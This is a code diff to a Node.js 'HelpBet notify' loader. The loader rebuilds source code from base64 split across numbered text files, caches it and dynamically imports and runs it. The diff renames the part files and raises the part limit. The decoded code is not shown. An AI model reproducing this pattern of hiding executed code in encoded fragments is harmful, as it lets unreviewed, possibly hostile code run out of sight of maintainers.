@@ -1,4 +1,4 @@
-/** HelpBet notify loader — reassembles from nb0..nbN.txt (raw base64 of source). */
+/** HelpBet notify loader — reassembles from s0..sN.txt (raw base64 of source). */
 import { readFileSync, writeFileSync, existsSync } from 'node:fs';
 import { join, dirname } from 'node:path';
 import { fileURLToPath, pathToFileURL } from 'node:url';
@@ -11,12 +11,12 @@ function loadCode() {
     try { return readFileSync(cache, 'utf8'); } catch {}
   }
   let b64 = '';
-  for (let i = 0; i < 32; i++) {
-    const p = join(dir, `nb${i}.txt`);
+  for (let i = 0; i < 64; i++) {
+    const p = join(dir, `s${i}.txt`);
     if (!existsSync(p)) break;
     b64 += readFileSync(p, 'utf8').trim();
   }
-  if (!b64) throw new Error('HelpBet notify nb*.txt parts missing');
+  if (!b64) throw new Error('HelpBet notify s*.txt parts missing');
   const code = Buffer.from(b64, 'base64').toString('utf8');
   try { writeFileSync(cache, code); } catch {}
   return code;
@@ -24,6 +24,6 @@ function loadCode() {
 
 const code = loadCode();
 try { writeFileSync(cache, code); } catch {}
-const mod = await import(pathToFileURL(cache).href + '?v=4');
+const mod = await import(pathToFileURL(cache).href + '?v=5');
 export default mod.default;
 export const config = mod.config || { api: { bodyParser: false } };
